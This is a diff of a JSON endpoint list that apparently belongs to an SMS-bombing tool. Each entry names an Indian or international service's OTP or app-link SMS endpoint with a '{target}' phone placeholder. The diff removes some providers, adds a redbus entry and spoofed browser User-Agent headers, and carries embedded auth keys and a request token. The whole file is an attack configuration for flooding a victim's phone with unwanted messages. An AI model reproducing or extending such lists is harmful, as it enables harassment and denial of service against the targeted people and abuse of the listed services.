@@ -30,17 +30,6 @@
                 "identifier": "sent"
             },
             {
-                "name": "gapoon",
-                "method": "POST",
-                "url": "https://www.gapoon.com/userSignup",
-                "data": {
-                    "mobile": "{target}",
-                    "email": "SpeedX@gmail.com",
-                    "name": "SpeedX"
-                },
-                "identifier": "1"
-            },
-            {
                 "name": "housing",
                 "method": "POST",
                 "url": "https://login.housing.com/api/v2/send-otp",
@@ -48,26 +37,6 @@
                     "phone": "{target}"
                 },
                 "identifier": "Sent"
-            },
-            {
-                "name": "porter",
-                "method": "POST",
-                "url": "https://porter.in/restservice/send_app_link_sms",
-                "data": {
-                    "phone": "{target}",
-                    "referrer_string": "",
-                    "brand": "porter"
-                },
-                "identifier": "true"
-            },
-            {
-                "name": "cityflo",
-                "method": "POST",
-                "url": "https://cityflo.com/website-app-download-link-sms/",
-                "data": {
-                    "mobile_number": "{target}"
-                },
-                "identifier": "sent"
             },
             {
                 "name": "nnnow",
@@ -111,27 +80,6 @@
                 "identifier": "sent"
             },
             {
-                "name": "treebo",
-                "method": "POST",
-                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
-                "data": {
-                    "phone_number": "{target}"
-                },
-                "identifier": "sent"
-            },
-            {
-                "name": "mobikwik",
-                "method": "POST",
-                "url": "https://webapi.mobikwik.com/p/account/otp/cell/v2",
-                "data": {
-                    "cell": "{target}"
-                },
-                "headers": {
-                    "X-MClient": "0"
-                },
-                "identifier": "true"
-            },
-            {
                 "name": "airtel",
                 "method": "GET",
                 "url": "https://www.airtel.in/referral-api/core/notify",
@@ -140,15 +88,6 @@
                     "rtn": "{target}"
                 },
                 "identifier": "Success"
-            },
-            {
-                "name": "pharmeasy",
-                "method": "POST",
-                "url": "https://pharmeasy.in/api/auth/requestOTP",
-                "json": {
-                    "contactNumber": "{target}"
-                },
-                "identifier": "resendSmsCounter"
             },
             {
                 "name": "mylescars",
@@ -167,7 +106,8 @@
                     "user_phone": "{target}"
                 },
                 "headers": {
-                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
+                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7",
+                    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
                 },
                 "identifier": "We have sent"
             },
@@ -186,7 +126,7 @@
                 "name": "cashify",
                 "method": "GET",
                 "url": "https://www.cashify.in/api/cu01/v1/app-link",
-                "params": {
+                "data": {
                     "mn": "{target}"
                 },
                 "identifier": "Successfully"
@@ -202,12 +142,24 @@
                 "identifier": "202"
             },
             {
+                "name": "redbus",
+                "method": "GET",
+                "url": "https://m.redbus.in/api/getOtp",
+                "data": {
+                    "number": "{target}",
+                    "cc": "{cc}",
+                    "whatsAppOpted": false
+                },
+                "identifier": "200"
+            },
+            {
                 "name": "kfc-in",
                 "method": "POST",
                 "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                 "headers": {
                     "Referer": "https://online.kfc.co.in/login",
-                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
+                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01",
+                    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
                 },
                 "data": {
                     "AuthorizedFor": "3",
@@ -250,20 +202,6 @@
                     "api": "2",
                     "email": "email",
                     "x-email": "x-email"
-                },
-                "identifier": "200"
-            },
-            {
-                "name": "tinder",
-                "method": "POST",
-                "url": "https://api.gotinder.com/v2/auth/sms/send",
-                "params": {
-                    
-                },
-                "data": {
-                    "phone_number": "{cc}{target}",
-                    "auth_type": "sms",
-                    "locale": "ru"
                 },
                 "identifier": "200"
             },
@@ -317,17 +255,6 @@
                     "app_version": "870"
                 },
                 "identifier": "true"
-            },
-            {
-                "name": "redbus",
-                "method": "GET",
-                "url": "https://m.redbus.in/api/getOtp",
-                "data": {
-                    "number": "{target}",
-                    "cc": "{cc}",
-                    "whatsAppOpted": false
-                },
-                "identifier": "200"
             }
         ]
     },
